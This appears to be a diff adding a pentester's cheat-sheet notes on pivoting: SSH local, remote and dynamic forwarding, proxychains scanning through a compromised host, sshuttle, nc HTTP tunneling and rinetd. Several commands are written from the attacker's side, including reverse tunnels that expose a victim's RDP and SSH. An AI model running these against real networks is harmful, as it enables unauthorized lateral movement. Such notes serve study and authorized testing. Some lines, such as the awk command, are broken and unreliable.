@@ -1,0 +1,62 @@
+PIVOTING
+
+Forwarding
+SSH tunneling
+	static port forwarding
+		local port forwarding
+ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
+ssh 192.168.1.2 -p 53 -L 8080:100.10.11.1:80
+	sshd_addr		 endpoint:  web_addr :httport
+ssh>http://127.0.0.1:8080
+-assume atacker running sshd on port 53
+-Once the tunnel is created, we browse to local port 8080, which redirects our traffic
+-through the outbound SSH tunnel on TCP port 53 on our home machine, then to the
+-web server.
+		remote(/reverse) port fowarding
+ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+target: ssh 192.168.1.2 -p 53 -R 3390:127.0.0.01:3389 
+attacker: rdesktop 127.0.0.1:3390
+-From the penetrated internal machine, you create a reverse SSH tunnel with your
+-attacking machine, through which you expose the victim’s RDP port on your attacking
+-machine on port 3390
+	dynamic port forwarding
+ssh -D 8080 -p 22000 10.11.1.252
+
+proxychains
+	victim machine(shell)
+ssh -f -N -R 2222:127.0.0.1:22 root@10.11.0.207
+ssh -f -N -D 127.0.0.1:8080 -p 2222 root@127.0.0.1
+	attacker machine
+proxychains nmap --top-ports=100 -sT -Pn 192.168.1.1/24
+
+sshuttle
+sshuttle -r username@sshserver 0.0.0.0/0
+sshuttle --dns -r username@sshserver 0/0
+
+
+HTTP Tunneling
+nc -nvv 10.11.1.15 8888
+	CONNECT 10.11.1.15:80 HTTP/1.0
+	HEAD / HTTP/1.0
+encapsulation:
+httptunnel
+stunnel
+
+Servers
+nano $(locate /rinted.conf\n)
+# bindadress bindport connectaddress connectport
+  192.168.1.2	53		10.11.1.24		80
+awk '/#\<bindadress\<bindport\<connectaddress\<connectport/ {for i=1; i<=2; i++}'
+
+
+
+
+Scanning
+FTP Bounce
+
+Idle Scan
+
+
+Sniffing
+
+
